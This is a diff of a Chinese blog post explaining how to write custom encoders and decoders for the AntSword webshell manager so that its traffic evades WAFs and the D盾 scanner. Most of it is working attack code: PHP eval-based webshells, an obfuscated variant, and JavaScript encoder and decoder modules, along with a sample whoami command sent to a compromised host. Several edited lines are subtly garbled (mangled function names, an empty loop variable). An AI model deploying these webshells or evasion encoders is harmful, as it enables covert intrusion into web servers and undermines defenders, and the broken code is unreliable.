@@ -103,30 +103,30 @@ title: 蚁剑自定义编码器和解码器来bypass waf
 
 
 ```json
-/
-  _php::base64编码器
+/*
+  php::base64编码器
   Create at: 2020/05/19 16:35:59
- /
+ */
 
 'use strict';
 
-/
+/*
  @param  {String} pwd   连接密码
  @param  {Array}  data  编码器处理前的 payload 数组
  @return {Array}  data  编码器处理后的 payload 数组
-/
+*/
 module.exports = (pwd, data, ext={}) => {
   // ##########    请在下方编写你自己的代码   ###################
   // 以下代码为 PHP Base64 样例
 
   // 生成一个随机变量名
-  let randomID =_ _`0x${Math.random().toString(16).substr(2)}`__`;
+  let randomID = 0x${Math.random().toString(16).substr(2)};
   // 原有的 payload 在 data['']中
   // 取出来之后，转为 base64 编码并放入 randomID key 下
   data[randomID] = Buffer.from(data['']).toString('base64');
 
   // shell 在接收到 payload 后，先处理 pwd 参数下的内容，
-  data[pwd] = eval(base64decode(`_$_POST[$_`{randomID}]));;
+  data[pwd] = eval(base64decode($_POST[${randomID}]));;
 
   // ##########    请在上方编写你自己的代码   ###################
 
@@ -134,8 +134,7 @@ module.exports = (pwd, data, ext={}) => {
   delete data[''];
   // 返回编码器处理后的 payload 数组
   return data;
-}`_
-
+}
 ```
 
 
@@ -143,18 +142,18 @@ module.exports = (pwd, data, ext={}) => {
 
 
 ```json
-/
-  _php::base64编码器
+/*
+  php::base64编码器
   Create at: 2020/05/19 16:57:59
- /
+ */
 
 'use strict';
 
-/
+/*
  @param  {String} pwd   连接密码
  @param  {Array}  data  编码器处理前的 payload 数组
  @return {Array}  data  编码器处理后的 payload 数组
-/
+*/
 module.exports = (pwd, data, ext={}) => {
   // ##########    请在下方编写你自己的代码   ###################
   // 以下代码为 PHP Base64 样例
@@ -167,8 +166,7 @@ module.exports = (pwd, data, ext={}) => {
   delete data[''];
   // 返回编码器处理后的 payload 数组
   return data;
-}_
-
+}
 ```
 
 
@@ -176,8 +174,7 @@ module.exports = (pwd, data, ext={}) => {
 
 
 ```php
-<?php eval(base64_decode($_POST['test']));?>
-
+<?php eval(base64decode($POST['test']));?>
 ```
 
 
@@ -203,13 +200,13 @@ module.exports = (pwd, data, ext={}) => {
 
 
 ```json
-_'use strict';
+'use strict';
 
-/
+/*
  @param  {String} pwd   连接密码
  @param  {Array}  data  编码器处理前的 payload 数组
  @return {Array}  data  编码器处理后的 payload 数组
-/
+*/
 module.exports = (pwd, data, ext={}) => {
   // ##########    请在下方编写你自己的代码   ###################
   // 原有的 payload 在 data['']中
@@ -226,8 +223,7 @@ module.exports = (pwd, data, ext={}) => {
   delete data[''];
   // 返回编码器处理后的 payload 数组
   return data;
-}_
-
+}
 ```
 
 
@@ -236,11 +232,10 @@ module.exports = (pwd, data, ext={}) => {
 
 ```php
 <?php
-$st = $_POST['test'];_
-$sa = str_replace('lwk02nm','',$_st);
+$st = $POST['test'];
+$sa = str_replace('lwk02nm','',$st);
 eval(base64decode($sa));
-?>_
-
+?>
 ```
 
 
@@ -283,7 +278,7 @@ D盾将上传的webshell判断为1级，1级是可以免杀的，再结合我们
 可看到参数`kd8aa13e6949d3`的值还是base64编码，解码后的值为：`cd /d "C:/phpstudy/PHPTutorial/WWW"&whoami&echo [S]&cd&echo [E]`还是具有明显的特征会被waf拦截。
 
 
-`由于蚁剑只会对data`[`pwd]里面的参数按照设定的编码器编码，其它参数默认使用base64编码，所以其它参数一旦被waf解码还是会有明显的特征，从而导致被拦截。那有办法将全部的参数编码吗？在蚁剑的一个issue里，作者给出了解决办法，具体的请去[这里`](https://github.com/AntSwordProject/antSword/issues/185)查看。
+由于蚁剑只会对datapwd里面的参数按照设定的编码器编码，其它参数默认使用base64编码，所以其它参数一旦被waf解码还是会有明显的特征，从而导致被拦截。那有办法将全部的参数编码吗？在蚁剑的一个issue里，作者给出了解决办法，具体的请去[[这里](https://github.com/AntSwordProject/antSword/issues/185)]查看。
 
 
 ![2020%2005%2021%2013%2044%2011.png](../post_images/3942f8f27da0f61bca6f439e9e5a2ff9.png)
@@ -293,25 +288,25 @@ D盾将上传的webshell判断为1级，1级是可以免杀的，再结合我们
 
 
 ```php
-/
-  _php::base64编码器
+/*
+  php::base64编码器
   Create at: 2020/05/21 13:07:23
- /
+ */
 
 'use strict';
 
-/
+/*
  @param  {String} pwd   连接密码
  @param  {Array}  data  编码器处理前的 payload 数组
  @return {Array}  data  编码器处理后的 payload 数组
-/
+*/
 module.exports = (pwd, data) => {
   // ##########    请在下方编写你自己的代码   ###################
   let ret = {};
   for (let  in data){
-    if (_ _=== '_') { continue };
-    ret[_] = Buffer.from(data[_]).toString('base64');
-    ret[_] = 'lwk02nm' + ret[__];
+    if ( === '') { continue };
+    ret[] = Buffer.from(data[]).toString('base64');
+    ret[] = 'lwk02nm' + ret[];
     ret[] += 'lwk02nm';
   }
   ret[pwd] = Buffer.from(data['']).toString('base64');
@@ -319,8 +314,7 @@ module.exports = (pwd, data) => {
   ret[pwd] += 'lwk02nm';
   // 返回编码器处理后的 payload 数组
   return ret;
-}_
-
+}
 ```
 
 
@@ -373,35 +367,34 @@ yzddmr6大佬已经通过修改蚁剑源码实现了上述功，项目地址是�
 
 
 ```json
-/
-  _php::base64解码器
+/*
+  php::base64解码器
   Create at: 2020/05/22 10:21:48
- /
+ */
 
 'use strict';
 
 module.exports = {
-  /_
-    _`@returns {string} asenc 将返回数据base64编码
+  /*
+    @returns {string} asenc 将返回数据base64编码
     自定义输出函数名称必须为 asenc
     该函数使用的语法需要和shell保持一致
-   /
+   */
   asoutput: () => {
     return function asenc($out){
       return @base64encode($out);
     }
     .replace(/\n\s+/g, '');
   },
-  /`_
-    _解码 Buffer
+  /*
+    解码 Buffer
     @param {string} data 要被解码的 Buffer
     @returns {string} 解码后的 Buffer
-   /
+   */
   decodebuff: (data, ext={}) => {
     return Buffer.from(data.toString(), 'base64');
   }
-}_
-
+}
 ```
 
 
@@ -412,19 +405,19 @@ module.exports = {
 
 
 ```json
-/
-  _php::base64自定义解码器
+/*
+  php::base64自定义解码器
   Create at: 2020/05/22 10:21:48
- /
+ */
 
 'use strict';
 
 module.exports = {
-  /_
-    _`@returns {string} asenc 将返回数据base64编码
+  /*
+    @returns {string} asenc 将返回数据base64编码
     自定义输出函数名称必须为 asenc
     该函数使用的语法需要和shell保持一致
-   /
+   */
   asoutput: () => {
     return function asenc($out){
       //返回时添加一个随机字符串，避免被waf解码成功
@@ -432,17 +425,16 @@ module.exports = {
     }
     .replace(/\n\s+/g, '');
   },
-  /`_
-    _解码 Buffer
+  /*
+    解码 Buffer
     @param {string} data 要被解码的 Buffer
     @returns {string} 解码后的 Buffer
-   /
+   */
   decodebuff: (data, ext={}) => {
     let res = Buffer.from(data.toString().replace(/wg4a2/g,''), 'base64');
     return res;
   }
-}_
-
+}
 ```
 
 
@@ -475,4 +467,4 @@ module.exports = {
 - [AntSword编码器篇(一) HelloWorld​](https://mp.weixin.qq.com/s/EHDvRA3Lpykpu0BDS17ENQ)
 - [蚁剑实现动态秘钥编码器解码器](https://xz.aliyun.com/t/6571)
 - [_WAF拦了蚁剑发送的其它参数时怎么操作_](https://mp.weixin.qq.com/s/ai3dW8HZnlFMPo-pgoqZw)
-- [AntSword编码器篇(二)](https://mp.weixin.qq.com/s?biz=MzI0MDI5MTQ3OQ==&mid=2247483991&idx=1&sn=7f5e52e8d8b7a00f7d2889d8a628ef10&chksm=e91c59afde6bd0b99bf22c5ef675828bc3202f2be23eea9e9519d4259af83a15f813c946bd47&mpshare=1&scene=23&srcid=0519DoTZK79rt9hiksYzCv47&sharer_sharetime=1589856866463&sharer_shareid=f5d04c386d841caa7b6a34a6658938ee%23rd)
+- [AntSword编码器篇(二)](https://mp.weixin.qq.com/s?biz=MzI0MDI5MTQ3OQ%3D%3D&mid=2247483991&idx=1&sn=7f5e52e8d8b7a00f7d2889d8a628ef10&chksm=e91c59afde6bd0b99bf22c5ef675828bc3202f2be23eea9e9519d4259af83a15f813c946bd47&mpshare=1&scene=23&srcid=0519DoTZK79rt9hiksYzCv47&sharersharetime=1589856866463&sharershareid=f5d04c386d841caa7b6a34a6658938ee%23rd)
